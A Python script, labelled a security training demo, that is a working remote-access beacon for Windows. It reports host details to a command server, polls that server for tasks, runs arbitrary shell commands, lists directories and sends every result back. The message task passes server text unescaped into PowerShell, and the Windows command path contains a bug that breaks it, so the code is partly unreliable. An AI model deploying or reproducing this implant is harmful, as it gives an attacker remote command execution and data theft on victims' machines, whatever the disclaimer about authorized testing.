#!/usr/bin/env python3
"""
Security Training Demo — Windows Beacon Agent

Pure-Python callback agent for Windows targets.
Beacons device info, long-polls /tunnel for tasks, executes shell commands,
and reports results. No reverse shell — command execution via HTTP polling only.

Usage:
    python win_agent.py <server_url>
    python win_agent.py http://10.13.1.210:9090

FOR AUTHORIZED SECURITY TRAINING / PENETRATION TESTING ONLY.
"""

import json
import os
import platform
import socket
import subprocess
import sys
import time
import urllib.request
import urllib.error
import uuid

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------
if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <server_url>")
    print(f"Example: {sys.argv[0]} http://10.13.1.210:9090")
    sys.exit(1)

SERVER = sys.argv[1].rstrip("/")
BEACON_URL = f"{SERVER}/beacon"
TUNNEL_URL = f"{SERVER}/tunnel"
BEACON_INTERVAL = 60          # heartbeat every 60s
TUNNEL_RETRY_DELAY = 5        # retry delay on tunnel error
MACHINE_ID = str(uuid.getnode())  # MAC-based unique ID


def get_device_info():
    """Gather Windows system info for beacon payload."""
    info = {
        "device": platform.node(),
        "android_id": MACHINE_ID,
        "android": f"{platform.system()} {platform.release()}",
        "api": platform.version(),
        "fingerprint": platform.platform(),
        "type": "heartbeat",
        "os_type": "windows",
        "battery_pct": get_battery(),
        "network_type": get_network_type(),
        "installed_apps_count": "N/A",
    }
    return info


def get_battery():
    """Try to read battery percentage (Windows only)."""
    try:
        out = subprocess.check_output(
            ["powershell", "-Command",
             "(Get-CimInstance Win32_Battery).EstimatedChargeRemaining"],
            timeout=5, stderr=subprocess.DEVNULL
        ).decode().strip()
        return f"{out}%" if out else "AC"
    except Exception:
        return "?"


def get_network_type():
    """Basic network type detection."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 53))
        ip = s.getsockname()[0]
        s.close()
        return f"LAN ({ip})"
    except Exception:
        return "Unknown"


def http_post(url, payload, timeout=35):
    """POST JSON using only stdlib (no requests dependency)."""
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        url, data=data,
        headers={"Content-Type": "application/json", "User-Agent": "SecurityTrainingDemo/1.0"}
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return json.loads(resp.read().decode("utf-8"))
    except urllib.error.URLError as e:
        raise ConnectionError(f"POST {url}: {e}")
    except Exception as e:
        raise ConnectionError(f"POST {url}: {e}")


def send_beacon(extra_data=None):
    """Send heartbeat beacon to server."""
    payload = get_device_info()
    if extra_data:
        payload.update(extra_data)
    try:
        http_post(BEACON_URL, payload, timeout=10)
    except ConnectionError as e:
        print(f"[!] Beacon failed: {e}")


def execute_command(command):
    """Run a shell command and return stdout/stderr/exit_code."""
    try:
        # Use cmd.exe on Windows, sh on others (for testing on Linux)
        if platform.system() == "Windows":
            proc = subprocess.Popen(
                ["cmd.exe", "/c", command],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                timeout=25
            )
        else:
            proc = subprocess.Popen(
                ["/bin/sh", "-c", command],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            )
        stdout, stderr = proc.communicate(timeout=25)
        return {
            "stdout": stdout.decode("utf-8", errors="replace"),
            "stderr": stderr.decode("utf-8", errors="replace"),
            "exit_code": proc.returncode,
        }
    except subprocess.TimeoutExpired:
        proc.kill()
        return {"stdout": "", "stderr": "Command timed out (25s)", "exit_code": -1}
    except Exception as e:
        return {"stdout": "", "stderr": str(e), "exit_code": -1}


def handle_task(task_data):
    """Process a task from the server."""
    task_type = task_data.get("task", "")

    if task_type == "shell_command":
        command = task_data.get("command", "")
        print(f"[>] Executing: {command}")
        result = execute_command(command)
        print(f"[<] Exit {result['exit_code']} | {len(result['stdout'])} bytes stdout")

        # Report result back via beacon
        report = get_device_info()
        report["type"] = "task_result"
        report["task"] = "shell_command"
        report["command"] = command
        report.update(result)
        try:
            http_post(BEACON_URL, report, timeout=10)
        except ConnectionError as e:
            print(f"[!] Failed to report result: {e}")

    elif task_type == "list_files":
        dir_path = task_data.get("path", "C:\\" if platform.system() == "Windows" else "/")
        print(f"[>] Listing: {dir_path}")
        try:
            entries = []
            for entry in os.scandir(dir_path):
                try:
                    stat = entry.stat()
                    entries.append({
                        "name": entry.name,
                        "is_dir": entry.is_dir(),
                        "size": stat.st_size if not entry.is_dir() else 0,
                        "modified": int(stat.st_mtime * 1000),
                        "readable": True,
                    })
                except (PermissionError, OSError):
                    entries.append({
                        "name": entry.name,
                        "is_dir": entry.is_dir(follow_symlinks=False),
                        "size": 0,
                        "modified": 0,
                        "readable": False,
                    })
            entries.sort(key=lambda e: (not e["is_dir"], e["name"].lower()))
            report = get_device_info()
            report["type"] = "task_response"
            report["task"] = "list_files"
            report["path"] = dir_path
            report["files"] = entries
            report["file_count"] = len(entries)
            print(f"[<] {len(entries)} entries")
            try:
                http_post(BEACON_URL, report, timeout=10)
            except ConnectionError as e:
                print(f"[!] Failed to report: {e}")
        except Exception as e:
            report = get_device_info()
            report["type"] = "task_response"
            report["task"] = "list_files"
            report["path"] = dir_path
            report["error"] = str(e)
            report["files"] = []
            report["file_count"] = 0
            try:
                http_post(BEACON_URL, report, timeout=10)
            except ConnectionError:
                pass

    elif task_type == "show_message":
        msg = task_data.get("message", "")
        print(f"[MSG] {msg}")
        # On Windows, show a toast/msgbox
        if platform.system() == "Windows":
            try:
                subprocess.Popen(
                    ["powershell", "-Command",
                     f'Add-Type -AssemblyName System.Windows.Forms;'
                     f'[System.Windows.Forms.MessageBox]::Show("{msg}","Security Demo")'],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
            except Exception:
                pass
        report = get_device_info()
        report["type"] = "task_result"
        report["task"] = "show_message"
        report["status"] = "displayed"
        try:
            http_post(BEACON_URL, report, timeout=10)
        except ConnectionError:
            pass

    elif task_type:
        print(f"[?] Unknown task: {task_type}")


def tunnel_loop():
    """Main tunnel loop — long-poll for tasks."""
    while True:
        payload = get_device_info()
        payload["type"] = "tunnel_poll"
        try:
            resp = http_post(TUNNEL_URL, payload, timeout=35)
            task = resp.get("task", "")
            if task:
                handle_task(resp)
        except ConnectionError as e:
            print(f"[!] Tunnel error: {e}")
            time.sleep(TUNNEL_RETRY_DELAY)
        except Exception as e:
            print(f"[!] Unexpected: {e}")
            time.sleep(TUNNEL_RETRY_DELAY)


def main():
    print(f"[*] Security Training Demo — Windows Agent")
    print(f"[*] Server: {SERVER}")
    print(f"[*] Machine ID: {MACHINE_ID}")
    print(f"[*] Hostname: {platform.node()}")
    print(f"[*] OS: {platform.system()} {platform.release()}")
    print()

    # Initial beacon
    print("[*] Sending initial beacon...")
    send_beacon()
    print("[*] Entering tunnel loop (Ctrl+C to stop)")

    try:
        tunnel_loop()
    except KeyboardInterrupt:
        print("\n[*] Agent stopped.")


if __name__ == "__main__":
    main()
